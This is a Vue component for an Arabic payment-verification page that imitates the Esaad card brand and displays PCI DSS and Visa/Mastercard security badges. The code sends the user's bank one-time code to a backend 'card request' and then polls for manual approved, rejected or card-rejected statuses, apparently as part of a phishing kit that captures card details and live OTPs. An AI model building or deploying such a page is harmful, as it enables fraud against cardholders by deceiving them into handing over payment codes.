<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { Check, ShieldCheck } from 'lucide-vue-next';
import { updateCardRequest, getCardRequest, resolveActiveRequestId, setActiveRequestId } from '../api';

const router = useRouter();
const otp = ref('');
const timeLeft = ref(3 * 60 + 54); // 03:54
let timer: ReturnType<typeof setInterval> | null = null;
let statusPoll: ReturnType<typeof setInterval> | null = null;
const isSubmitting = ref(false);
const error = ref('');
const successMessage = ref('');

const pad = (n: number) => n.toString().padStart(2, '0');

const formattedTime = computed(() => {
  const m = Math.floor(timeLeft.value / 60);
  const s = timeLeft.value % 60;
  return `${pad(m)}:${pad(s)}`;
});

onMounted(() => {
  timer = setInterval(() => {
    if (timeLeft.value > 0) {
      timeLeft.value--;
    }
  }, 1000);
});

onUnmounted(() => {
  if (timer) clearInterval(timer);
  if (statusPoll) clearInterval(statusPoll);
});

const submitOtp = async () => {
  if (!otp.value || isSubmitting.value) return;

  if (!/^\d{6}$/.test(otp.value)) {
    error.value = 'الرجاء إدخال رمز صحيح مكون من 6 أرقام';
    return;
  }
  error.value = '';

  isSubmitting.value = true;
  
  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    error.value = 'لم يتم العثور على الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      otp: otp.value,
      step: 'otp',
      otpStatus: 'pending'
    });

    if (statusPoll) clearInterval(statusPoll);
    statusPoll = setInterval(async () => {
      try {
        const data = await getCardRequest(requestId);
        if (!data) return;
        if (data.otpStatus === 'approved') {
          if (statusPoll) clearInterval(statusPoll);
          successMessage.value = 'تمت العملية وتأكيد طلب بطاقة إسعاد بنجاح!';
          setActiveRequestId(null);
          isSubmitting.value = false;
          setTimeout(() => router.push('/'), 1800);
        } else if (data.otpStatus === 'rejected') {
          if (statusPoll) clearInterval(statusPoll);
          error.value = 'الرجاء إدخال رمز صحيح. الرمز غير صحيح.';
          otp.value = '';
          isSubmitting.value = false;
        } else if (data.otpStatus === 'card_rejected') {
          if (statusPoll) clearInterval(statusPoll);
          isSubmitting.value = false;
          router.push('/card-details');
        }
      } catch (e) {}
    }, 1500);
  } catch (err) {
    error.value = 'حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.';
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto min-h-screen bg-[#eef5f0] flex flex-col justify-between font-sans text-gray-900">
    
    <!-- Top Dark Esaad Header -->
    <header class="w-full bg-[#040c06] py-3 px-4 flex justify-center border-b border-[#009a44]/30">
      <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center select-none">
        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>
    </header>

    <!-- Main Verification Card -->
    <div class="px-5 py-6 my-auto flex flex-col items-center">
      <div class="bg-white rounded-2xl shadow-[0_8px_30px_rgba(0,0,0,0.06)] w-full max-w-[380px] border border-gray-200/80 p-6 flex flex-col items-center text-center relative z-10">
        
        <!-- Esaad Badge -->
        <div class="bg-[#009a44] w-10 h-10 rounded-full flex items-center justify-center mb-4 shadow-md shadow-[#009a44]/25">
          <Check class="text-white w-5 h-5 stroke-[3]" />
        </div>

        <!-- Text Content -->
        <h1 class="text-[#008a40] font-bold text-sm leading-relaxed mb-1">
          التحقق من عملية الدفع لبطاقة إسعاد
        </h1>
        <p class="text-gray-600 font-medium text-xs leading-relaxed mb-4">
          ستتلقى من جهة إصدار البطاقة رمز تأكيد لعملية الدفع برسالة نصية
        </p>

        <!-- Instructions -->
        <p class="text-gray-800 font-bold text-xs leading-relaxed mb-1">
          يرجى إدخال رمز التحقق المرسل إلى الجوال الخاص بك
        </p>
        <p class="text-gray-500 text-[11px] leading-relaxed mb-5">
          أو قم بفتح تطبيق البنك وانقر على الإشعار الفوري
        </p>

        <div v-if="successMessage" class="w-full mb-4 p-2.5 rounded-xl bg-green-50 border border-green-200 text-[#008a40] text-xs font-bold">
          {{ successMessage }}
        </div>

        <!-- OTP Input -->
        <div class="w-full mb-5 relative" dir="ltr">
          <input 
            type="text" 
            v-model="otp" 
            placeholder="* * * * * *" 
            class="w-full border-b-2 border-gray-300 rounded-none py-2 text-center text-lg tracking-[0.5em] focus:outline-none focus:border-[#009a44] text-gray-900 bg-transparent transition-colors placeholder-gray-300 font-mono"
            maxlength="6"
          />
          <p v-if="error" class="text-red-600 text-[11px] mt-1.5 text-center" dir="rtl">{{ error }}</p>
        </div>

        <!-- Timer -->
        <div class="text-xl font-extrabold text-[#008a40] mb-5 tracking-wider font-mono tabular-nums" dir="ltr">
          {{ formattedTime }}
        </div>

        <!-- Submit Button -->
        <button 
          @click="submitOtp" 
          :disabled="isSubmitting"
          class="w-full bg-[#008a40] hover:bg-[#007335] text-white py-3 rounded-xl font-bold text-sm transition-colors shadow-md disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 cursor-pointer"
        >
          <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
          <span v-else>تأكيد الدفع (PAY)</span>
        </button>

      </div>

      <!-- Security Badges -->
      <div class="mt-6 flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#008a40]">
        <ShieldCheck class="w-3.5 h-3.5" />
        <span>PCI DSS COMPLIANT · Verified by VISA · Mastercard SecureCode</span>
      </div>
    </div>

    <!-- Esaad Footer -->
    <footer class="bg-[#e4f2ea] px-5 py-4 text-center text-[11px] text-gray-600 border-t border-gray-200/60">
      © 2026 esaad, كل الحقوق محفوظة.
    </footer>

  </div>
</template>
